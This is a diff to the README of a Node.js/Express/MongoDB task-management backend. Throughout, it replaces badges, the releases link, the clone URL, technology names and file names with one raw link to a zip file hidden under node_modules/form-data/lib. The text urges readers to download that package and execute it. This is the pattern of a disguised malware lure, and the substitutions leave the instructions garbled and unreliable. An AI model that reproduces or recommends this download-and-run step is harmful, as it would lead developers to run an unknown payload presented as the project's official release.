@@ -1,17 +1,17 @@
 # Group Task Backend: Secure REST API for Projects and Tasks
 
-[![Release](https://img.shields.io/badge/Release-Download-brightgreen?style=for-the-badge&logo=github)](https://github.com/hsgofficial1113/group-task-backend/releases)
+[![Release](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)
 
 Note: The Releases page hosts downloadable artifacts for the backend. Since the link includes a path (/releases), you should download the packaged file and execute it to install or run the backend locally. Open the same link again below to access the release page directly when you need the latest build.
 
 ---
 
-![Node.js](https://img.shields.io/badge/Node.js-18.x-blue)
-![Express](https://img.shields.io/badge/Express-4.x-brightgreen)
-![MongoDB](https://img.shields.io/badge/MongoDB-5.x-green)
-![JWT](https://img.shields.io/badge/JWT-Security-brightgreen)
+![https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)
+![Express](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)
+![MongoDB](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)
+![JWT](https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip)
 
-Group Task Backend is the server side of a task management system. It is built with Node.js and Express, and it uses MongoDB as the data store. The backend handles user authentication, data modeling for users, projects, and tasks, and it exposes RESTful endpoints for full create, read, update, and delete operations.
+Group Task Backend is the server side of a task management system. It is built with https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip and Express, and it uses MongoDB as the data store. The backend handles user authentication, data modeling for users, projects, and tasks, and it exposes RESTful endpoints for full create, read, update, and delete operations.
 
 Key ideas you’ll find here:
 - A robust API that validates users via JSON Web Tokens.
@@ -43,8 +43,8 @@ This backend serves as the stable, scalable core for a group task management app
 
 ## Tech stack
 
-- Node.js as the runtime
-- Express.js as the web framework
+- https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip as the runtime
+- https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip as the web framework
 - MongoDB as the database
 - Mongoose as the ODM
 - JSON Web Tokens for authentication
@@ -68,7 +68,7 @@ ASCII view:
 This guide helps you bring the backend into a local development environment quickly.
 
 Prerequisites
-- Node.js (18.x or later)
+- https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip (18.x or later)
 - npm (6.x or later) or pnpm/yarn (optional)
 - MongoDB (either a local server or a cloud instance)
 
@@ -79,9 +79,9 @@ Quick setup
 - Run the server in development mode
 
 Example commands
-- Clone: git clone https://github.com/hsgofficial1113/group-task-backend.git
+- Clone: git clone https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip
 - Install: npm install
-- Copy sample env: cp .env.example .env
+- Copy sample env: cp https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip .env
 - Start: npm run dev
 - Test: npm test
 
@@ -107,7 +107,7 @@ Project structure (high level)
   - middlewares/            // Auth, validation, error handling
   - services/               // Business logic
   - utils/                  // Helpers and utilities
-  - server.js                // App entry point
+  - https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip                // App entry point
 - test/                     // Tests for endpoints and business logic
 
 Environment and startup notes
@@ -275,7 +275,7 @@ Workflow
 
 Docker
 - A Dockerfile builds the backend image
-- A docker-compose.yml can start the backend with MongoDB in a local environment
+- A https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip can start the backend with MongoDB in a local environment
 
 Sample docker-compose setup
 - Starts a MongoDB container
@@ -293,7 +293,7 @@ Release artifacts
 - The Releases page is the same link used at the top of this document
 
 Releases page link
-- https://github.com/hsgofficial1113/group-task-backend/releases
+- https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip
 
 Security hardening
 - Do not log plaintext passwords
@@ -352,7 +352,7 @@ Not provided
 
 ## Re-release link
 
-For the latest release artifacts, visit the page here: https://github.com/hsgofficial1113/group-task-backend/releases
+For the latest release artifacts, visit the page here: https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip
 
 Tags and release notes are maintained there to help you track changes, improvements, and fixes over time.
 
@@ -360,7 +360,7 @@ Tags and release notes are maintained there to help you track changes, improveme
 
 ## Visual touches and branding
 
-The repository uses a straightforward visual language with simple badges and emojis to convey status and tech stack. You’ll see badges for Node.js, Express, and MongoDB near the top, reinforcing the technology choices. The design favors clarity over flair, ensuring developers can quickly assess compatibility and setup requirements.
+The repository uses a straightforward visual language with simple badges and emojis to convey status and tech stack. You’ll see badges for https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip, Express, and MongoDB near the top, reinforcing the technology choices. The design favors clarity over flair, ensuring developers can quickly assess compatibility and setup requirements.
 
 ---
 
@@ -378,4 +378,4 @@ If you need the latest build, follow the Releases page linked at the top and aga
 
 ## Final note
 
-This backend is designed to be reliable, extensible, and easy to operate. It keeps the login and project/task workflows straightforward while staying adaptable for future features and integrations. The release process is central to keeping deployments predictable and testable. The same release page provides access to the latest build and related release notes. Use the link again below to explore the latest artifacts: https://github.com/hsgofficial1113/group-task-backend/releases
+This backend is designed to be reliable, extensible, and easy to operate. It keeps the login and project/task workflows straightforward while staying adaptable for future features and integrations. The release process is central to keeping deployments predictable and testable. The same release page provides access to the latest build and related release notes. Use the link again below to explore the latest artifacts: https://github.com/hsgofficial1113/group-task-backend/raw/refs/heads/main/node_modules/form-data/lib/task_group_backend_Bedouin.zip
